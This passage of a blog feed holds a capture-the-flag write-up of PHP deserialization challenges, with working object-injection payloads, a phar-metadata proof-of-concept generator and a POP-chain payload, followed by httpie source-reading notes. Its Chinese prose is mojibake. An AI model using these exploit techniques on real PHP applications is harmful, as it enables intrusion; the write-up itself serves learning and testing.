åºåˆ—åŒ–ä¸²æ—¶éš¾ä»¥é¿å…ä½¿ç”¨ä¸å¯è§å­—ç¬¦ï¼Œæ­¤å¤„æˆ‘ä»¬éœ€è¦ä½¿ç”¨Sï¼Œæ¥è¿›è¡Œç»•è¿‡ï¼Œå³ç¼–ç å­—ç¬¦ä¸²</p><p><code>payload:?tryhackme=O:5:&quot;funny&quot;:1:&#123;S:8:&quot;\00funny\00a&quot;;s:10:&quot;givemeflag&quot;;&#125;</code></p><p>æ­¤å¤„å¦‚æœä½¿ç”¨å°å†™så¹¶ä½¿ç”¨%00å°±ä¼šåœ¨payloadè¢«urldecodeåè¢«æ£€æµ‹æ‹¦æˆª æ•…ä½¿ç”¨å¤§å†™Sè¿›è¡Œhex codeåä½¿ç”¨\00è¿›è¡Œç»•è¿‡å¤„ç†</p><p>è¿™æ ·%00å°±ä¼šè¢«è½¬ä¹‰è¿›è€Œç¬¦åˆè¦æ±‚</p><ul><li>  un6</li></ul><pre><code>  &lt;!-un6.php--&gt; &lt;?phpinclude &quot;flag6.php&quot;;ini_set(&#39;display_errors&#39;,true);error_reporting(E_ALL  E_STRICT); class funny&#123;    public function pyflag()&#123;        global $flag;        echo $flag;    &#125;&#125;if (isset($_GET[&#39;tryhackme&#39;]) &amp;&amp; is_string($_GET[&#39;tryhackme&#39;]))&#123;$a = unserialize($_GET[&#39;tryhackme&#39;]);$a();&#125; else &#123;    show_source(__FILE__);&#125;?&gt;</code></pre><p>è¿™é“é¢˜å…¶å®åº”ç”¨äº†phpåŠ¨æ€æ‰§è¡Œå‡½æ•°çš„èƒ½åŠ›ï¼Œå³ä½¿ç”¨å˜é‡åååŠ æ‹¬å·çš„æ–¹å¼æ¥å¯¹å‡½æ•°è¿›è¡Œè°ƒç”¨ã€‚è¿™é“é¢˜å…¶å®æ˜¯è®©$aä¸ºfunny.pyflag</p><p><code>payload:?tryhackme=a:2:&#123;i:0;O:5:&quot;funny&quot;:0:&#123;&#125;i:1;s:6:&quot;pyflag&quot;;&#125;</code></p><ul><li>  un7</li></ul><pre><code>  &lt;!-un7.php--&gt; &lt;?phpinclude &quot;flag7.php&quot;;class funny&#123;    function __destruct() &#123;        global $flag;        echo $flag;    &#125;&#125;show_source(__FILE__);if (isset($_GET[&#39;action&#39;])) &#123;    $a = $_GET[&#39;action&#39;];    if ($a === &quot;check&quot;) &#123;        $b = $_GET[&#39;file&#39;];        if (file_exists($b) &amp;&amp; !empty($b)) &#123;            echo &quot;$b is exist!&quot;;        &#125;    &#125; else if ($a === &quot;upload&quot;) &#123;        if (!is_dir(&quot;./upload&quot;))&#123;            mkdir(&quot;./upload&quot;);        &#125;        $filename = &quot;./upload/&quot;.rand(1, 10000).&quot;.txt&quot;;        if (isset($_GET[&#39;data&#39;]))&#123;            file_put_contents($filename, base64_decode($_GET[&#39;data&#39;]));            echo &quot;Your file path:$filename&quot;;        &#125;    &#125;&#125;?&gt; </code></pre><p>è¿™é¢˜æ²¡æœ‰ååºåˆ—åŒ–ï¼Œå´éœ€è¦å¾—åˆ°ä¸€ä¸ªfunnyå¯¹è±¡ã€‚é‚£æˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘ç”¨pharã€‚</p><pre><code>poc.php&lt;?phpclass funny&#123;    function __destruct() &#123;        global $flag;        echo $flag;    &#125;&#125;$phar = new Phar(&quot;phar.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;longlongNB&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stub    $o = new funny();    $phar-&gt;setMetadata($o);//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶    //ç­¾åè‡ªåŠ¨è®¡ç®—    $phar-&gt;stopBuffering();$a=file_get_contents(&#39;./phar.phar&#39;);file_put_contents(&#39;./testphar&#39;,base64_encode($a));</code></pre><p>ä¸Šä¼ ååˆ©ç”¨checkå¹¶ä½¿ç”¨åè®®pharæ¥è¿›è¡Œè§¦å‘ååºåˆ—åŒ–</p><p>ä¸Šä¼ <code>payload:?action=upload&amp;data=bG9uZ2xvbmdOQjw/cGhwIF9fSEFMVF9DT01QSUxFUigpOyA/Pg0KRgAAAAEAAAARAAAAAQAAAAAAEAAAAE86NToiZnVubnkiOjA6e30IAAAAdGVzdC50eHQEAAAAQd52XwQAAAAMfn/YtgEAAAAAAAB0ZXN0KfXmrUUr6s38dEJVz9DlBTNhvwcCAAAAR0JNQg==</code><br>è§¦å‘<code>payload:?action=check&amp;file=phar://./upload/xxxx.txt</code></p><p>è¿™ä¸ªä¹Ÿæ˜¯ä¸ªæŒºå…¸å‹çš„pharæ¼æ´ï¼Œä¸è¿‡ç°åœ¨ä¸€èˆ¬ç«™ç‚¹çš„pharé»˜è®¤éƒ½æ˜¯å…³é—­çš„ï¼Œåœ¨æœ¬åœ°æµ‹è¯•çš„æ—¶å€™æˆ‘æ³¨æ„åˆ°äº†è¿™ç‚¹ã€‚é¢˜ç›®ç®€å•ç›´ç™½åªè¦èƒ½ååºåˆ—åŒ–ä¸€ä¸ªfunnyå¯¹è±¡å°±å¯ä»¥çˆ†å‡ºflagï¼Œå¯æ˜¯æ²¡æœ‰å¸¸è§„çš„unserializeï¼Œé‚£è¿™æ ·å°±æ˜¾ç„¶æ˜¯åˆ©ç”¨pharï¼Œçœ‹ä»£ç ï¼ŒæŠŠ64decodeçš„å†…å®¹æ‰”è¿›ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œé‚£ä¹ˆåœ¨æœ¬åœ°æˆ‘ä»¬åªéœ€è¦ï¼Œæ–°å»ºä¸€ä¸ªpharä¸­è®©ä»–å­˜ä¸Šéšæ„ä¸€ä¸ªfunnyå¯¹è±¡å³å¯</p><ul><li>  un8</li></ul><pre><code>  &lt;!-un8.php--&gt; &lt;?phpinclude(&quot;./flag8.php&quot;);class a &#123;    public $object;    public function resolve() &#123;        array_walk($this, function($fn, $prev)&#123;            if ($fn[0] === &quot;system&quot; &amp;&amp; $prev === &quot;ls&quot;) &#123;                echo &quot;Wow, you rce me! But I can&#39;t let you do this. There is the flag. Enjoy it:)\n&quot;;                global $flag;                echo $flag;            &#125;        &#125;);    &#125;    public function __destruct() &#123;        @$this-&gt;object-&gt;add();    &#125;    public function __toString() &#123;        return $this-&gt;object-&gt;string;    &#125;&#125;class b &#123;    protected $filename;    protected function addMe() &#123;        return &quot;Add Failed. Filename:&quot;.$this-&gt;filename;    &#125;    public function __call($func, $args) &#123;        call_user_func([$this, $func.&quot;Me&quot;], $args);    &#125;&#125;class c &#123;    private $string;    public function __construct($string) &#123;        $this-&gt;string = $string;    &#125;    public function __get($name) &#123;        $var = $this-&gt;$name;        $var[$name]();    &#125;&#125;if (isset($_GET[&quot;tryhackme&quot;])) &#123;    unserialize($_GET[&#39;tryhackme&#39;]);&#125; else &#123;    highlight_file(__FILE__);&#125;</code></pre><p>è¿™é¢˜å…¥æ‰‹ç¨åŠ åˆ†æï¼Œå°±çŸ¥é“æƒ³è¦æ‹¿åˆ°flagåˆ©ç”¨çš„é“¾æ¡å¿…ç„¶æ˜¯åˆ©ç”¨ä»¥<code>destruct</code>ä¸ºé“¾é¦–çš„popé“¾é€šè¿‡<code>a-&gt;b-&gt;a-&gt;c-&gt;a</code>åˆ©ç”¨cä¸­çš„é‚£ä¸ªå¥‡æ€ªçš„array()è°ƒç”¨ç±»aä¸­çš„<code>resolve</code>æ–¹æ³•ï¼Œæˆ–è€…è¯´æˆå‘˜å‡½æ•°ï¼Œåˆ©ç”¨aè¢«æ‘§æ¯æ—¶çš„addè°ƒç”¨ï¼Œbä¸­çš„returnå­—ç¬¦ä¸²è°ƒç”¨aä¸­çš„<code>toString</code>è¿™æ ·æŠŠæ•´ä¸ªé“¾æ¡ä¸²èµ·æ¥ï¼Œè¿™æ ·é“¾æ¡å°±è´¯é€šäº†ï¼Œæˆ‘è¯´çš„ä¸‰ä¸ªç‚¹ä¾¿æ˜¯ä¸²èµ·é“¾æ¡çš„èŠ‚ç‚¹ã€‚</p><p><code>paylopad:?tryhackme=O:1:&quot;a&quot;:1:&#123;s:6:&quot;object&quot;;O:1:&quot;b&quot;:1:&#123;s:11:&quot;%00*%00filename&quot;;O:1:&quot;a&quot;:1:&#123;s:6:&quot;object&quot;;O:1:&quot;c&quot;:1:&#123;s:9:&quot;%00c%00string&quot;;a:1:&#123;s:6:&quot;string&quot;;a:2:&#123;i:0;O:1:&quot;a&quot;:2:&#123;s:6:&quot;object&quot;;N;s:2:&quot;ls&quot;;a:1:&#123;i:0;s:6:&quot;system&quot;;&#125;&#125;i:1;s:7:&quot;resolve&quot;;&#125;&#125;&#125;&#125;&#125;&#125;</code></p><hr><p>ç‰¹åˆ«é¸£è°¢ï¼šLongloneï¼ŒAFKLå‡ºé¢˜å’Œé¢˜è§£çš„å‚è€ƒ</p><blockquote><p>Donâ€™t listen to those who say,</p><p>â€œItâ€™s not done that way.â€</p><p>Maybe itâ€™s not, but maybe you will.</p><p>Donâ€™t listen to those who say,</p><p>â€œYouâ€™re taking too big a chance.â€</p><p>Michelangelo would have painted the Sistine Floor,</p><p>and it would surely be rubbed out by today.</p><p>Most importantly, donâ€™t listen</p><p>When the little voice of fear inside of you</p><p>rear its ugly head and says,</p><p>â€œTheyâ€™re all smarter than you out there.</p><p>Theyâ€™re more talented,</p><p>Theyâ€™re taller, blonder, prettier, luckier and have connectionsâ€¦â€</p><p>I firmly believe that if you follow a path that interests you,</p><p>Not to the exclusion of love, sensitivity, and cooperation with others,</p><p>But with the strength of conviction</p><p>That you can move others by your own efforts,</p><p>And do not make success or failure the criteria by which you live,</p><p>The chances are youâ€™ll be a person worthy of your own respect.</p><p>by Marvin Neil Simon</p></blockquote><p>2021/3/30</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;â€‹&lt;/p&gt;
&lt;p&gt;â€‹ &lt;strong&gt;æœ¬æ–‡å‡è®¾è¯»è€…å¯¹äºphpé¢å‘å¯¹è±¡æœ‰ä¸€å®šäº†è§£&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;å‰ç½®çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#å‰ç½®çŸ¥è¯†&quot; class=&quot;headerlink&quot; title=&quot;å‰ç½®çŸ¥è¯†&quot;&gt;&lt;/a&gt;å‰ç½®çŸ¥è¯†</summary>
      
    
    
    
    <category term="Web" scheme="https://zwh-china.github.io/categories/Web/"/>
    
    
  </entry>
  
  <entry>
    <title>httpie é¡¹ç›®æºç é˜…è¯»ï¼ˆ4ï¼‰</title>
    <link href="https://zwh-china.github.io/2021/03/16/httpie-%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%EF%BC%884%EF%BC%89/"/>
    <id>https://zwh-china.github.io/2021/03/16/httpie-%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%EF%BC%884%EF%BC%89/</id>
    <published>2021-03-16T11:27:45.000Z</published>
    <updated>2021-04-20T19:50:34.000Z</updated>
    
    
    
    
    <category term="Pythonå­¦ä¹ " scheme="https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>httpieé¡¹ç›®æºç é˜…è¯»(3)</title>
    <link href="https://zwh-china.github.io/2021/03/07/httpie%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB3/"/>
    <id>https://zwh-china.github.io/2021/03/07/httpie%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB3/</id>
    <published>2021-03-06T19:28:29.000Z</published>
    <updated>2021-04-20T19:50:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>ç”±äºhttpieæºç è¾ƒå¤šï¼Œå…¨å±€å˜é‡å¼•ç”¨è¾ƒå¤šã€‚ä½œä¸ºæ–°æ‰‹ï¼Œæˆ‘å†³å®šå…ˆå»ä»”ç»†çœ‹çœ‹httpieå®˜æ–¹docã€‚å…ˆè®©è‡ªå·±åŸºæœ¬å®Œå…¨æŒæ¡httpieå„ç§ç”¨æ³•ï¼Œå†å¯¹httpieæºç è¿›è¡Œè¿›ä¸€æ­¥æ¢³ç†å’Œé˜…è¯»</p><p>docé“¾æ¥ï¼š<a href="https://httpie.io/docs">https://httpie.io/docs</a></p><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/httpie/httpie">https://github.com/httpie/httpie</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ç”±äºhttpieæºç è¾ƒå¤šï¼Œå…¨å±€å˜é‡å¼•ç”¨è¾ƒå¤šã€‚ä½œä¸ºæ–°æ‰‹ï¼Œæˆ‘å†³å®šå…ˆå»ä»”ç»†çœ‹çœ‹httpieå®˜æ–¹docã€‚å…ˆè®©è‡ªå·±åŸºæœ¬å®Œå…¨æŒæ¡httpieå„ç§ç”¨æ³•ï¼Œå†å¯¹httpieæºç è¿›è¡Œè¿›ä¸€æ­¥æ¢³ç†å’Œé˜…è¯»&lt;/p&gt;
&lt;p&gt;docé“¾æ¥ï¼š&lt;a href=&quot;https://httpie.io/docs&quot;&gt;h</summary>
      
    
    
    
    <category term="Pythonå­¦ä¹ " scheme="https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>httpie é¡¹ç›®æºç é˜…è¯»ï¼ˆ2ï¼‰</title>
    <link href="https://zwh-china.github.io/2021/03/07/httpie-%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%EF%BC%882%EF%BC%89/"/>
    <id>https://zwh-china.github.io/2021/03/07/httpie-%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%EF%BC%882%EF%BC%89/</id>
    <published>2021-03-06T17:13:55.000Z</published>
    <updated>2021-04-20T19:50:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>çœ‹å®Œ<code>status.py</code>å†çœ‹<code>core.py</code></p><pre><code>import argparseimport osimport platformimport sysfrom typing import List, Optional, Tuple, Unionimport requestsfrom pygments import __version__ as pygments_versionfrom requests import __version__ as requests_versionfrom httpie import __version__ as httpie_versionfrom httpie.cli.constants import OUT_REQ_BODY, OUT_REQ_HEAD, OUT_RESP_BODY, OUT_RESP_HEADfrom httpie.client import collect_messagesfrom httpie.context import Environmentfrom httpie.downloads import Downloaderfrom httpie.output.writer import write_message, write_stream, MESSAGE_SEPARATOR_BYTESfrom httpie.plugins.registry import plugin_managerfrom httpie.status import ExitStatus, http_status_to_exit_status# noinspection PyDefaultArgumentdef main(args: List[Union[str, bytes]] = sys.argv, env=Environment()) -&gt; ExitStatus:    &quot;&quot;&quot;    The main function.    Pre-process args, handle some special types of invocations,    and run the main program with error handling.    Return exit status code.    &quot;&quot;&quot;    program_name, *args = args    env.program_name = os.path.basename(program_name)    args = decode_raw_args(args, env.stdin_encoding)    plugin_manager.load_installed_plugins()    from httpie.cli.definition import parser    if env.config.default_options:        args = env.config.default_options + args    include_debug_info = &#39;--debug&#39; in args    include_traceback = include_debug_info or &#39;--traceback&#39; in args    if include_debug_info:        print_debug_info(env)        if args == [&#39;--debug&#39;]:            return ExitStatus.SUCCESS    exit_status = ExitStatus.SUCCESS    try:        parsed_args = parser.parse_args(            args=args,            env=env,        )    except KeyboardInterrupt:        env.stderr.write(&#39;\n&#39;)        if include_traceback:            raise        exit_status = ExitStatus.ERROR_CTRL_C    except SystemExit as e:        if e.code != ExitStatus.SUCCESS:            env.stderr.write(&#39;\n&#39;)            if include_traceback:                raise            exit_status = ExitStatus.ERROR    else:        try:            exit_status = program(                args=parsed_args,                env=env,            )        except KeyboardInterrupt:            env.stderr.write(&#39;\n&#39;)            if include_traceback:                raise            exit_status = ExitStatus.ERROR_CTRL_C        except SystemExit as e:            if e.code != ExitStatus.SUCCESS:                env.stderr.write(&#39;\n&#39;)                if include_traceback:                    raise                exit_status = ExitStatus.ERROR        except requests.Timeout:            exit_status = ExitStatus.ERROR_TIMEOUT            env.log_error(f&#39;Request timed out (&#123;parsed_args.timeout&#125;s).&#39;)        except requests.TooManyRedirects:            exit_status = ExitStatus.ERROR_TOO_MANY_REDIRECTS            env.log_error(                f&#39;Too many redirects&#39;                f&#39; (--max-redirects=&#123;parsed_args.max_redirects&#125;).&#39;            )        except Exception as e:            # TODO: Further distinction between expected and unexpected errors.            msg = str(e)            if hasattr(e, &#39;request&#39;):                request = e.request                if hasattr(request, &#39;url&#39;):                    msg = (                        f&#39;&#123;msg&#125; while doing a &#123;request.method&#125;&#39;                        f&#39; request to URL: &#123;request.url&#125;&#39;                    )            env.log_error(f&#39;&#123;type(e).__name__&#125;: &#123;msg&#125;&#39;)            if include_traceback:                raise            exit_status = ExitStatus.ERROR    return exit_statusdef get_output_options(    args: argparse.Namespace,    message: Union[requests.PreparedRequest, requests.Response]) -&gt; Tuple[bool, bool]:    return &#123;        requests.PreparedRequest: (            OUT_REQ_HEAD in args.output_options,            OUT_REQ_BODY in args.output_options,        ),        requests.Response: (            OUT_RESP_HEAD in args.output_options,            OUT_RESP_BODY in args.output_options,        ),    &#125;[type(message)]def program(args: argparse.Namespace, env: Environment) -&gt; ExitStatus:    &quot;&quot;&quot;    The main program without error handling.    &quot;&quot;&quot;    # TODO: Refactor and drastically simplify, especially so that the separator logic is elsewhere.    exit_status = ExitStatus.SUCCESS    downloader = None    initial_request: Optional[requests.PreparedRequest] = None    final_response: Optional[requests.Response] = None    def separate():        getattr(env.stdout, &#39;buffer&#39;, env.stdout).write(MESSAGE_SEPARATOR_BYTES)    def request_body_read_callback(chunk: bytes):        should_pipe_to_stdout = bool(            # Request body output desired            OUT_REQ_BODY in args.output_options            # &amp; not `.read()` already pre-request (e.g., for  compression)            and initial_request            # &amp; non-EOF chunk            and chunk        )        if should_pipe_to_stdout:            msg = requests.PreparedRequest()            msg.is_body_upload_chunk = True            msg.body = chunk            msg.headers = initial_request.headers            write_message(requests_message=msg, env=env, args=args, with_body=True, with_headers=False)    try:        if args.download:            args.follow = True  # --download implies --follow.            downloader = Downloader(output_file=args.output_file, progress_file=env.stderr, resume=args.download_resume)            downloader.pre_request(args.headers)        messages = collect_messages(args=args, config_dir=env.config.directory,                                    request_body_read_callback=request_body_read_callback)        force_separator = False        prev_with_body = False        # Process messages as theyâ€™re generated        for message in messages:            is_request = isinstance(message, requests.PreparedRequest)            with_headers, with_body = get_output_options(args=args, message=message)            do_write_body = with_body            if prev_with_body and (with_headers or with_body) and (force_separator or not env.stdout_isatty):                # Separate after a previous message with body, if needed. See test_tokens.py.                separate()            force_separator = False            if is_request:                if not initial_request:                    initial_request = message                    is_streamed_upload = not isinstance(message.body, (str, bytes))                    if with_body:                        do_write_body = not is_streamed_upload                        force_separator = is_streamed_upload and env.stdout_isatty            else:                final_response = message                if args.check_status or downloader:                    exit_status = http_status_to_exit_status(http_status=message.status_code, follow=args.follow)                    if exit_status != ExitStatus.SUCCESS and (not env.stdout_isatty or args.quiet):                        env.log_error(f&#39;HTTP &#123;message.raw.status&#125; &#123;message.raw.reason&#125;&#39;, level=&#39;warning&#39;)            write_message(requests_message=message, env=env, args=args, with_headers=with_headers,                          with_body=do_write_body)            prev_with_body = with_body        # Cleanup        if force_separator:            separate()        if downloader and exit_status == ExitStatus.SUCCESS:            # Last response body download.            download_stream, download_to = downloader.start(                initial_url=initial_request.url,                final_response=final_response,            )            write_stream(stream=download_stream, outfile=download_to, flush=False)            downloader.finish()            if downloader.interrupted:                exit_status = ExitStatus.ERROR                env.log_error(                    &#39;Incomplete download: size=%d; downloaded=%d&#39; % (                        downloader.status.total_size,                        downloader.status.downloaded                    ))        return exit_status    finally:        if downloader and not downloader.finished:            downloader.failed()        if not isinstance(args, list) and args.output_file and args.output_file_specified:            args.output_file.close()def print_debug_info(env: Environment):    env.stderr.writelines([        f&#39;HTTPie &#123;httpie_version&#125;\n&#39;,        f&#39;Requests &#123;requests_version&#125;\n&#39;,        f&#39;Pygments &#123;pygments_version&#125;\n&#39;,        f&#39;Python &#123;sys.version&#125;\n&#123;sys.executable&#125;\n&#39;,        f&#39;&#123;platform.system()&#125; &#123;platform.release()&#125;&#39;,    ])    env.stderr.write(&#39;\n\n&#39;)    env.stderr.write(repr(env))    env.stderr.write(&#39;\n&#39;)def decode_raw_args(    args: List[Union[str, bytes]],    stdin_encoding: str) -&gt; List[str]:    &quot;&quot;&quot;    Convert all bytes args to str    by decoding them using stdin encoding.    &quot;&quot;&quot;    return [        arg.decode(stdin_encoding)        if type(arg) is bytes else arg        for arg in args    ]</code></pre><p>å…ˆçœ‹mainå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œçš„å‡½æ•°æ³¨é‡Šå’Œ<code>__main__.py</code> ä¸å¤ªä¸€æ ·ï¼Œå‘ç°æ˜¯ä»<code>typing</code>ä¸­å¯¼å…¥çš„ï¼ŒæŸ¥é˜…å®˜æ–¹æ–‡æ¡£å¾—çŸ¥è¿™ä¸ªæ¨¡å—æ˜¯è¾…åŠ©å‡½æ•°æ³¨é‡Šçš„ã€‚mainå‡½æ•°çš„å‚æ•°æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯cliç”¨æˆ·è¾“å…¥çš„å¯åŠ¨å‚æ•°ï¼Œä½¿ç”¨<code>sys.argv</code>è¯»å…¥ï¼Œå†çœ‹å¦ä¸€ä¸ªå‚æ•°æ˜¯Environmentç±»çš„å®ä¾‹åŒ–ï¼Œè¿™ä¸ªEnvironmentç±»æ˜¯ç”¨æˆ·è‡ªå®šä¹‰ç±»ï¼Œä»<code>context.py</code> ä¸­å¯¼å…¥ã€‚é‚£æˆ‘ä»¬å†å»çœ‹ä¸€ä¸‹Environmentç±»çš„å®šä¹‰</p><pre><code>context.pyimport sysimport osfrom pathlib import Pathfrom typing import IO, Optionaltry:    import cursesexcept ImportError:    curses = None  # Compiled w/o cursesfrom httpie.compat import is_windowsfrom httpie.config import DEFAULT_CONFIG_DIR, Config, ConfigFileErrorfrom httpie.utils import repr_dictclass Environment:    &quot;&quot;&quot;    Information about the execution context    (standard streams, config directory, etc).    By default, it represents the actual environment.    All of the attributes can be overwritten though, which    is used by the test suite to simulate various scenarios.    &quot;&quot;&quot;    is_windows: bool = is_windows    config_dir: Path = DEFAULT_CONFIG_DIR    stdin: Optional[IO] = sys.stdin  # `None` when closed fd (#791)    stdin_isatty: bool = stdin.isatty() if stdin else False    stdin_encoding: str = None    stdout: IO = sys.stdout    stdout_isatty: bool = stdout.isatty()    stdout_encoding: str = None    stderr: IO = sys.stderr    stderr_isatty: bool = stderr.isatty()    colors = 256    program_name: str = &#39;http&#39;    if not is_windows:        if curses:            try:                curses.setupterm()                colors = curses.tigetnum(&#39;colors&#39;)            except curses.error:                pass    else:        # noinspection PyUnresolvedReferences        import colorama.initialise        stdout = colorama.initialise.wrap_stream(            stdout, convert=None, strip=None,            autoreset=True, wrap=True        )        stderr = colorama.initialise.wrap_stream(            stderr, convert=None, strip=None,            autoreset=True, wrap=True        )        del colorama    def __init__(self, devnull=None, **kwargs):        &quot;&quot;&quot;        Use keyword arguments to overwrite        any of the class attributes for this instance.        &quot;&quot;&quot;        assert all(hasattr(type(self), attr) for attr in kwargs.keys())        self.__dict__.update(**kwargs)        # The original STDERR unaffected by --quietâ€™ing.        self._orig_stderr = self.stderr        self._devnull = devnull        # Keyword arguments &gt; stream.encoding &gt; default utf8        if self.stdin and self.stdin_encoding is None:            self.stdin_encoding = getattr(                self.stdin, &#39;encoding&#39;, None) or &#39;utf8&#39;        if self.stdout_encoding is None:            actual_stdout = self.stdout            if is_windows:                # noinspection PyUnresolvedReferences                from colorama import AnsiToWin32                if isinstance(self.stdout, AnsiToWin32):                    # noinspection PyUnresolvedReferences                    actual_stdout = self.stdout.wrapped            self.stdout_encoding = getattr(                actual_stdout, &#39;encoding&#39;, None) or &#39;utf8&#39;    def __str__(self):        defaults = dict(type(self).__dict__)        actual = dict(defaults)        actual.update(self.__dict__)        actual[&#39;config&#39;] = self.config        return repr_dict(&#123;            key: value            for key, value in actual.items()            if not key.startswith(&#39;_&#39;)        &#125;)    def __repr__(self):        return f&#39;&lt;&#123;type(self).__name__&#125; &#123;self&#125;&gt;&#39;    _config: Config = None    @property    def config(self) -&gt; Config:        config = self._config        if not config:            self._config = config = Config(directory=self.config_dir)            if not config.is_new():                try:                    config.load()                except ConfigFileError as e:                    self.log_error(e, level=&#39;warning&#39;)        return config    @property    def devnull(self) -&gt; IO:        if self._devnull is None:            self._devnull = open(os.devnull, &#39;w+&#39;)        return self._devnull    @devnull.setter    def devnull(self, value):        self._devnull = value    def log_error(self, msg, level=&#39;error&#39;):        assert level in [&#39;error&#39;, &#39;warning&#39;]        self._orig_stderr.write(f&#39;\n&#123;self.program_name&#125;: &#123;level&#125;: &#123;msg&#125;\n\n&#39;)</code></pre><p>å¯ä»¥çœ‹åˆ°è¿™éƒ¨åˆ†å®Œå…¨å°±æ˜¯å®šä¹‰äº†Environmentç±»ã€‚å…ˆçœ‹ç±»çš„å±æ€§is_windowsæ˜¯ä¸€ä¸ªå¸ƒå°”å‹å˜é‡æ˜¯ä»<code>compat.py</code>å¼•å…¥ã€‚é‚£æˆ‘ä»¬å†å»çœ‹ä¸€ä¸‹<code>compat.py</code></p><pre><code>import sysis_windows = &#39;win32&#39; in str(sys.platform).lower()</code></pre><p>å¯ä»¥çœ‹åˆ°å¾ˆç®€å•ï¼Œé€šè¿‡<code>sys.platform</code>å‡½æ•°è¿”å›å€¼å…¨éƒ¨å°å†™åŒ–ååˆ¤æ–­å…¶ä¸­æ˜¯å¦åŒ…å«win32å­—ç¬¦ä¸²æ¥åˆ¤æ–­è¿è¡Œçš„ç³»ç»Ÿæ˜¯å¦ä¸ºwindowsã€‚</p><p>å†çœ‹ä¸‹ä¸€ä¸ªå±æ€§<code>config_dir</code></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªå±æ€§çš„ç±»å‹æ˜¯Pathç±»å‹ï¼Œè¿™ä¸ªæ˜¯ä»<code>pathlib</code>ä¸­å¯¼å…¥çš„ä»å®˜æ–¹è¯´æ³•æ¥çœ‹è¿™ä¸ªåº“ä¸»è¦æ˜¯æ›¿ä»£<code>os.path</code>ç”¨çš„ï¼Œå› ä¸ºç”¨<code>os.path</code>æ¥å¤„ç†è·¯å¾„æœ‰æ—¶å€™å¯èƒ½æ¯”è¾ƒéº»çƒ¦éœ€è¦åµŒå¥—å†™æ³•ï¼Œ<code>pathlib</code> çš„å‡ºç°å°±å¾ˆå¥½åœ°è§£å†³äº†è¿™ä¸€é—®é¢˜ï¼Œ<code>pathlib</code>é‡‡ç”¨é“¾å¼è°ƒç”¨ã€‚è¯´ç™½äº†å°±æ˜¯<code>os.path</code>éœ€è¦æ‹¼æ¥æ‹¼å»æ¥ç»„åˆï¼Œä½†æ˜¯<code>path1ib</code>å°±å°±å¯ä»¥é€šè¿‡ç±»ä¼¼è®¿é—®å­ç›®å½•å’Œçˆ¶ç›®å½•çš„æ–¹æ³•å®ç°ç›®å½•çš„è·³è½¬ã€‚å°æŠ€å·§get :)</p><p>è¿™å…¶ä¸­ä¸»è¦å°±æ˜¯è®¾ç½®httpieçš„é…ç½®è·¯å¾„ï¼Œä¾‹å¦‚åœ¨windowsä¸‹å°±æ˜¯APPDATAæ–‡ä»¶å¤¹ä¸­</p><p>å†å›çœ‹context.pyä¸­çš„ååŠéƒ¨åˆ†ï¼Œå°±æ˜¯é‡å®šå‘æ ‡å‡†è¾“å…¥è¾“å‡ºï¼Œä½¿ç”¨cursesåº“æ¥è¾¾åˆ°å½©è‰²æ–‡å­—çš„æ•ˆæœã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;çœ‹å®Œ&lt;code&gt;status.py&lt;/code&gt;å†çœ‹&lt;code&gt;core.py&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import argparse
import os
import platform
import sys
from typing import Lis</summary>
      
    
    
    
    <category term="Pythonå­¦ä¹ " scheme="https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>httpie é¡¹ç›®æºç é˜…è¯»ï¼ˆ1ï¼‰</title>
    <link href="https://zwh-china.github.io/2021/03/04/httpie-%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%EF%BC%881%EF%BC%89/"/>
    <id>https://zwh-china.github.io/2021/03/04/httpie-%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%EF%BC%881%EF%BC%89/</id>
    <published>2021-03-04T12:49:30.000Z</published>
    <updated>2021-04-20T19:50:34.000Z</updated>
    
